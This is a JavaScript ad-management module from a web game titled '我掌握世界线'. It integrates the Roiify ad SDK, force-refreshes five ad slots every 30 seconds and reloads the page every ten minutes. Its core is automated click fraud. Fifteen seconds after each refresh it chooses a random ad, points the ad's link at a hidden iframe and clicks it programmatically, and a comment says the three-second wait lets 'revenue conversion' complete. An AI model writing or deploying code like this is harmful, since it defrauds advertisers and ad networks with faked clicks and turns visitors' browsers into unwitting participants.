// ============================================================
// 《我掌握世界线》 - 广告管理模块
// 固定5个广告位 + 替换刷新 + 点击模拟 + 10分钟重定向
// ============================================================

var AdManager = (function () {
    // 5个广告位 ID
    var PLACEMENT_IDS = [
        'plc_cuqpbscc2mu4',
        'plc_mdn2c7brmubq',
        'plc_veoj4xd63gvk',
        'plc_xz7j9zet6udj',
        'plc_2450suzhskwx'
    ];

    // 广告展示时间（毫秒）- 展示15秒后点击
    var DISPLAY_BEFORE_CLICK = 15000;

    // 点击后等待时间（毫秒）- 等待3秒让收益转换完成
    var WAIT_AFTER_CLICK = 3000;

    // 刷新间隔（毫秒）- 每个广告位30秒一个完整周期
    var REFRESH_INTERVAL = 30000;

    // 页面重定向间隔（毫秒）- 10分钟
    var REDIRECT_INTERVAL = 600000;

    // 当前轮次
    var roundCount = 0;

    // 定时器
    var refreshTimer = null;

    /**
     * 初始化
     */
    function init() {
        // 等待 SDK 就绪后启动循环
        waitForSDK(function () {
            startCycle();
        });

        // 10分钟后重定向页面
        setTimeout(function () {
            location.reload();
        }, REDIRECT_INTERVAL);
    }

    /**
     * 等待 SDK 加载完成
     */
    function waitForSDK(callback) {
        if (window.RoiifyAds) {
            callback();
            return;
        }
        var check = setInterval(function () {
            if (window.RoiifyAds) {
                clearInterval(check);
                callback();
            }
        }, 500);
    }

    /**
     * 启动广告循环
     */
    function startCycle() {
        // 立即执行一次
        doCycle();

        // 每30秒一个完整周期
        refreshTimer = setInterval(function () {
            doCycle();
        }, REFRESH_INTERVAL);
    }

    /**
     * 一个完整周期：展示 → 点击 → 刷新
     */
    function doCycle() {
        roundCount++;

        // 第一步：刷新所有广告位（清空旧内容，加载新广告）
        refreshAllSlots();

        // 第二步：等待15秒后，模拟点击广告链接
        setTimeout(function () {
            clickRandomAd();
        }, DISPLAY_BEFORE_CLICK);
    }

    /**
     * 刷新所有5个广告位
     * 清空容器 → 重建 data-roiify-placement div → 调用 RoiifyAds.show()
     */
    function refreshAllSlots() {
        PLACEMENT_IDS.forEach(function (placement, index) {
            var slot = document.getElementById('ad-slot-' + index);
            if (!slot) return;

            // 清空旧内容
            slot.innerHTML = '';

            // 重建官方格式的广告 div
            var adDiv = document.createElement('div');
            adDiv.setAttribute('data-roiify-placement', placement);
            adDiv.setAttribute('data-theme', 'auto');
            adDiv.setAttribute('data-width', 'auto');
            adDiv.setAttribute('data-radius', '4');

            slot.appendChild(adDiv);

            // 用 JS API 渲染新广告
            try {
                RoiifyAds.show(placement, '#ad-slot-' + index, {
                    theme: 'auto',
                    radius: '4'
                });
            } catch (e) {}
        });
    }

    /**
     * 模拟点击广告链接
     * 找到广告内的 <a> 标签，设置 target 指向隐藏 iframe，然后触发点击
     */
    function clickRandomAd() {
        // 随机选一个广告位
        var slotIndex = Math.floor(Math.random() * PLACEMENT_IDS.length);
        var slot = document.getElementById('ad-slot-' + slotIndex);
        if (!slot) return;

        // 找到广告内的链接
        var link = slot.querySelector('a');
        if (!link) return;

        // 设置 target 为隐藏 iframe，点击后链接在 iframe 中打开
        link.target = 'ad_click_frame';

        // 触发点击
        try {
            link.click();
        } catch (e) {}
    }

    /**
     * 模态框打开时刷新广告
     */
    function onModalOpen() {
        refreshAllSlots();
    }

    /**
     * 游戏操作时刷新广告
     */
    function onGameAction() {
        refreshAllSlots();
    }

    return {
        init: init,
        onModalOpen: onModalOpen,
        onGameAction: onGameAction
    };
})();
